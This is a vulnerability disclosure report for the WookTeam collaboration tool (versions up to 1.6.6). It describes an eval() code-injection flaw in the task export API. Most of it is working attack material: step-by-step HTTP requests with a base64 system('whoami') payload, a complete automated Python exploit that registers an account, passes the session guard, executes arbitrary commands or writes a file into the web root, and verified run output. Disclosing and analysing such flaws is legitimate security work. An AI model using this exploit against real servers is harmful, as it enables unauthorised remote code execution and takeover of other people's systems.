# WookTeam Task Export RCE Vulnerability Report

## Introduction to Vulnerabilities

The project task export interface `/api/project/task/export` of WookTeam (an open-source lightweight team collaboration tool, "wookteam" on Gitee) is vulnerable to remote code execution. The `data` parameter is base64-decoded and passed directly into the `string2array()` function in `app/Module/Base.php`, which executes `eval("\$array = $data;")` whenever the decoded string starts with `array` and is not exactly `array`. An attacker can inject arbitrary PHP code into the `eval` call and achieve RCE. Only an ordinary registered account (registration is open by default) is required. arbitrary commands were executed and a WebShell was written to the web root.

---

## Affected Versions

WookTeam <= 1.6.6 (master / 1.6.x branches)

## Utilize conditions

- The target allows public registration (`/api/users/login?type=reg`, enabled by default)
- The attacker can create a project and become its owner, or is a member of a project with export permission

---

## Vulnerability Reproduction

![image-20260826093226160](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260826093226160.2dpfs18yo8.webp)

Step 1: Register an arbitrary user (open by default), the response returns a token:

```
GET /api/users/login?type=reg&username=cve_user2&userpass=cve123456
```

Response:

![image-20260826093422618](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260826093422618.1ow680lt9a.webp)

```
{"ret":1,"msg":"success","data":{"token":"NEBjdmVfdXNlcjJAYmxIUzZCQDE3ODc3MDgwNDFAN2lzUmY2"}}
```

Step 2: Create a project and become its owner:

```
GET /api/project/add?token=NEBjdmVfdXNlcjJAYmxIUzZCQDE3ODc3MDgwNDFAN2lzUmY2&title=Test_Project
```

Response:

![image-20260826093552935](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260826093552935.1ow680m5g2.webp)

```
{"ret":1,"msg":"添加成功！","data":[]}
```

The `add` interface does not return the projectid in `data`, query the project list to obtain it:

```
GET /api/project/lists?act=manage&token=NEBjdmVfdXNlcjJAYmxIUzZCQDE3ODc3MDgwNDFAN2lzUmY2
```

Response (the first item is the newest project, `id` is the projectid):

![image-20260826094204160](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260826094204160.7p4ccqw2lb.webp)

```
{"ret":1,"msg":"success","data":{"lists":[{"id":4,"title":"Test_Project","createuser":"cve_user2",...}]}}
```

So the projectid of `Test_Project` is 4.

Step 3: Obtain the labelid (sub-category id) of the project, which is required when creating a task. The `detail` interface returns `simpleLabel` with the label `id`:

```
GET /api/project/detail?token=NEBjdmVfdXNlcjJAYmxIUzZCQDE3ODc3MDgwNDFAN2lzUmY2&projectid=4
```

Response:

![image-20260826095222407](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260826095222407.pg2uujzf0.webp)

```
{"ret":1,"msg":"success","data":{"project":{...},"label":[...],"simpleLabel":[{"id":4,"title":"默认"}]}}
```

So the labelid of `Test_Project` is 4.

Step 4: Create a task in the project (the `task/lists?export=1` request in the next step fails with `未找到任何相关的任务！` if the project has no task, and the session is not set):

```
GET /api/project/task/add?token=NEBjdmVfdXNlcjJAYmxIUzZCQDE3ODc3MDgwNDFAN2lzUmY2&projectid=4&labelid=4&title=test_task_1
```

Response:

![image-20260826095310427](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260826095310427.1sfs5qg3vq.webp)

```
{"ret":1,"msg":"添加成功！","data":{"id":2,"projectid":4,"labelid":4,"title":"test_task_1",...}}
```

Step 5: Trigger the export request to set the session (**the session cookie must be kept**):

```
GET /api/project/task/lists?token=NEBjdmVfdXNlcjJAYmxIUzZCQDE3ODc3MDgwNDFAN2lzUmY2&projectid=4&export=1
```

![image-20260826100756407](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260826100756407.6bht8pluew.webp)

This request executes `Session::put('task::export:username', $user['username'])` (ProjectController.php:1368). The `task__export()` method checks this value first and returns HTTP 502 `请求已过期，请重新导出！` if it is empty, **before** the `eval()` is ever reached. Therefore the session cookie returned by this response **must** be sent along with the exploit request in the next step. Tools that keep cookies automatically (Burp cookie jar, `requests.Session()`) handle this transparently.

Step 6: Trigger the `eval` injection with the crafted payload `data` (carrying the Step 5 session cookie):

```
GET /api/project/task/export?token=NEBjdmVfdXNlcjJAYmxIUzZCQDE3ODc3MDgwNDFAN2lzUmY2&data=YXJyYXkoKTtzeXN0ZW0oJ3dob2FtaScpOy8v
Cookie: wookteam_session=<Step 5 response Set-Cookie value>
```

where `YXJyYXkoKTtzeXN0ZW0oJ3dob2FtaScpOy8v` is base64 of `array();system('whoami');//`.

After executing the payload, the command `whoami` is executed and its output is directly echoed in the first line of the response body:

![image-20260826100906719](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260826100906719.1vze3g9pss.webp)

```
desktop-nchj5ql\administrator
<!-- 参数错误！ (502 Bad Gateway) -->
```

The HTTP status is 502 because after `eval()` the parsed `$array` is empty, `$projectid` is 0, and the code path falls into `Base::ajaxError("参数错误！", [], 0, 502)` — but the injected code has already run.

---

## Root Cause Analysis (漏洞原理)

### 1. Unsafe `eval()` in `string2array()`

`app/Module/Base.php` (line 279-281): any string that starts with `array` and is not exactly `array` is executed with `eval`:

```php
if (strpos(strtolower($data), 'array') === 0 && strtolower($data) !== 'array') {
    @ini_set('display_errors', 'on');
    @eval("\$array = $data;");   // arbitrary PHP code injection
    @ini_set('display_errors', 'off');
}
```

![image-20260827090712380](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260827090712380.3nscyctcrn.webp)

### 2. User input reaches `eval()` without validation

`app/Http/Controllers/Api/ProjectController.php` (line 1408): the user-controlled `data` parameter is base64-decoded and passed straight into `string2array()`:

```php
$array = Base::string2array(base64_decode(urldecode(Request::input('data'))));
```

`eval("\$array = $data;")` turns the payload `array();system('whoami');//` into:

```php
$array = array();system('whoami');//;
```

The trailing `//` comments out the closing `;`, so the injected statement runs.

![image-20260827090900440](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260827090900440.102wo00lb8.webp)

### 3. Two obstacles an attacker must pass (both bypassed)

- **Session guard** (ProjectController.php:1404-1407): `Session::get('task::export:username')` must be non-empty. It is only written by `task__lists?export=1` (line 1368), which requires a project owned/export-permitted by the attacker and at least one task in it. Solution: complete the export-trigger step first and keep the session cookie.
- **Double `urldecode()`** (line 1408): the query string is URL-decoded once by PHP's request parser, then `urldecode()` runs a second time, which turns any literal `+` inside the base64 into a space and corrupts the payload. Simple payloads whose base64 happens to contain no `+` (e.g. `array();system('whoami');//`) work fine; for arbitrary payloads, encode `+` as `%2B` (i.e. `%252B` in the raw URL after one decode). See the PoC for the exact trick.

---

## Complete PoC 

A fully automated, self-contained Python PoC (`WookTeam1.6.6-RCE-poc.py`) that performs the whole chain: register → create project → resolve projectid/labelid → create task → trigger export (sets the session) → fire the payload. Session cookies are handled automatically by `requests.Session()`; the `+`/double-urldecode pitfall is handled as well.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
WookTeam <= 1.6.6 Remote Code Execution PoC
============================================

Vulnerability : project task export interface `/api/project/task/export`
                -> `Base::string2array()` -> `eval("\$array = $data;")` code injection
Trigger points:
    app/Module/Base.php:281                      @eval("\$array = $data;");
    app/Http/Controllers/Api/ProjectController.php:1408
        $array = Base::string2array(base64_decode(urldecode(Request::input('data'))));

Prerequisites:
    - public registration is open  (/api/users/login?type=reg)
    - attacker can create a project (becomes owner) and a task

Attack chain (all GET, no CSRF issue):
    register -> create project -> get projectid -> get labelid -> create task
    -> task/lists?export=1            (writes Session['task::export:username'])
    -> task/export?data=<b64>         (eval executes arbitrary PHP code)

Key point: the session cookie MUST be kept between the export-trigger request
and the exploit request, otherwise the 502 guard "请求已过期，请重新导出！"
fires before eval() is reached. `requests.Session()` handles the cookie
automatically.

Usage:
    python WookTeam1.6.6-RCE-poc.py --url http://127.0.0.1:8000 --cmd whoami
    python WookTeam1.6.6-RCE-poc.py --url http://127.0.0.1:8000 --cmd "ipconfig /all"
    python WookTeam1.6.6-RCE-poc.py --url http://127.0.0.1:8000 --webshell
    python WookTeam1.6.6-RCE-poc.py --url http://127.0.0.1:8000 --username cve_user1 --password cve123456 --cmd id

Only Python 3 + requests are required.
"""

import argparse
import base64
import random
import string
import sys

import requests

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")


def rand_name(prefix="cve_"):
    return prefix + "".join(random.choice(string.ascii_lowercase + string.digits)
                            for _ in range(8))


class WookTeamRCE:
    def __init__(self, url, username=None, password="cve123456"):
        self.base = url.rstrip("/")
        self.s = requests.Session()
        self.s.headers["User-Agent"] = UA
        self.username = username
        self.password = password
        self.token = None
        self.projectid = None
        self.labelid = None

    # ---------- helpers ----------
    def req(self, path, params=None):
        return self.s.get(self.base + path, params=params, timeout=60)

    @staticmethod
    def j(r):
        try:
            return r.json()
        except Exception:
            return {"ret": -1, "msg": r.text[:300]}

    @staticmethod
    def build_payload(php_code):
        # eval("\$array = $data;") -> trailing '//' comments out the closing ';'
        return "array();" + php_code + "//"

    @staticmethod
    def b64(s):
        return base64.b64encode(s.encode("utf-8")).decode("ascii")

    # ---------- chain ----------
    def auth(self):
        if self.username:
            r = self.j(self.req("/api/users/login",
                                {"type": "login", "username": self.username,
                                 "userpass": self.password}))
            if r.get("ret") == 1:
                self.token = r["data"]["token"]
                print(f"[+] login ok: {self.username}")
                return
            print(f"[!] login failed, try register: {r.get('msg')}")
        self.username = self.username or rand_name()
        r = self.j(self.req("/api/users/login",
                            {"type": "reg", "username": self.username,
                             "userpass": self.password}))
        if r.get("ret") != 1:
            sys.exit(f"[-] register failed: {r}")
        self.token = r["data"]["token"]
        print(f"[+] registered: {self.username}")

    def prepare_project_and_task(self):
        title = "RCE_Test_" + rand_name("")
        r = self.j(self.req("/api/project/add", {"token": self.token, "title": title}))
        if r.get("ret") != 1:
            sys.exit(f"[-] create project failed: {r}")
        r = self.j(self.req("/api/project/lists", {"act": "manage", "token": self.token}))
        if r.get("ret") != 1 or not r["data"].get("lists"):
            sys.exit(f"[-] list projects failed: {r}")
        self.projectid = r["data"]["lists"][0]["id"]  # newest project first
        r = self.j(self.req("/api/project/detail",
                            {"token": self.token, "projectid": self.projectid}))
        if r.get("ret") != 1:
            sys.exit(f"[-] project detail failed: {r}")
        self.labelid = r["data"]["simpleLabel"][0]["id"]
        r = self.j(self.req("/api/project/task/add",
                            {"token": self.token, "projectid": self.projectid,
                             "labelid": self.labelid, "title": "rce_task"}))
        if r.get("ret") != 1:
            sys.exit(f"[-] create task failed: {r}")
        print(f"[+] projectid={self.projectid} labelid={self.labelid} task created")

    def trigger_export(self):
        # task/lists?export=1 -> Session['task::export:username'] written into our cookie jar
        r = self.j(self.req("/api/project/task/lists",
                            {"token": self.token, "projectid": self.projectid,
                             "export": "1"}))
        if r.get("ret") != 1:
            sys.exit(f"[-] export trigger failed: {r}")
        print(f"[+] session set (task::export:username={self.username})")

    def rce(self, php_code):
        b64 = self.b64(self.build_payload(php_code))
        # Server does base64_decode(urldecode(Request::input('data'))) — PHP already
        # URL-decoded the query string once, then urldecode() runs a SECOND time and
        # would turn any '+' inside the base64 into a space, corrupting the payload.
        # Workaround: send '+' as '%2B' (requests percent-encodes the '%' -> '%252B'
        # in the raw URL; PHP decodes it back to '%2B', urldecode -> '+').
        data = b64.replace('+', '%2B')
        r = self.req("/api/project/task/export", {"token": self.token, "data": data})
        body = r.text
        # command output is echoed at the start of the body; the 502 error page HTML follows
        head = []
        for ln in body.splitlines():
            if ln.strip().startswith("<!") or ln.strip().startswith("<!--"):
                break
            if ln.strip():
                head.append(ln.strip())
        print(f"[*] HTTP {r.status_code}")
        if head:
            print(f"[+] command output:\n" + "\n".join(head))
        else:
            print(f"[?] no output, raw body head:\n{body[:500]}")

    def webshell(self, name="cve_pwned.php"):
        # __DIR__ inside eval = app/Module -> ../../public = web root
        code = ("file_put_contents(__DIR__.'/../../public/%s', "
                "'<?php echo \"CVE-RCE-OK\"; ?>');" % name)
        self.rce(code)
        v = self.s.get(self.base + "/" + name, timeout=30)
        print(f"[*] webshell check: HTTP {v.status_code} body={v.text[:80]!r}")


def main():
    ap = argparse.ArgumentParser(
        description="WookTeam <= 1.6.6 RCE PoC (task/export eval injection)")
    ap.add_argument("--url", default="http://127.0.0.1:8000", help="target base url")
    ap.add_argument("--username", default=None, help="reuse an account; auto-register if omitted")
    ap.add_argument("--password", default="cve123456")
    ap.add_argument("--cmd", default="whoami", help="command to run (default whoami)")
    ap.add_argument("--webshell", action="store_true",
                    help="write cve_pwned.php to web root and verify it")
    args = ap.parse_args()

    try:
        requests.get(args.url.rstrip("/") + "/", timeout=10)
    except Exception as e:
        sys.exit(f"[-] target unreachable: {e}")

    e = WookTeamRCE(args.url, args.username, args.password)
    e.auth()
    e.prepare_project_and_task()
    e.trigger_export()
    if args.webshell:
        e.webshell()
    else:
        e.rce("system(base64_decode('%s'));" % e.b64(args.cmd))


if __name__ == "__main__":
    main()
```

### Verified run output

```
$ python WookTeam1.6.6-RCE-poc.py --url http://127.0.0.1:8000 --cmd whoami
[+] registered: cve_0rbepygs
[+] projectid=6 labelid=6 task created
[+] session set (task::export:username=cve_0rbepygs)
[*] HTTP 502
[+] command output:
desktop-nchj5ql\administrator

$ python WookTeam1.6.6-RCE-poc.py --url http://127.0.0.1:8000 --webshell
[+] registered: cve_3vwf1ipp
[+] projectid=9 labelid=9 task created
[+] session set (task::export:username=cve_3vwf1ipp)
[*] HTTP 502
[?] no output, raw body head:
<!-- 参数错误！ (502 Bad Gateway) -->
[*] webshell check: HTTP 200 body='CVE-RCE-OK'
```

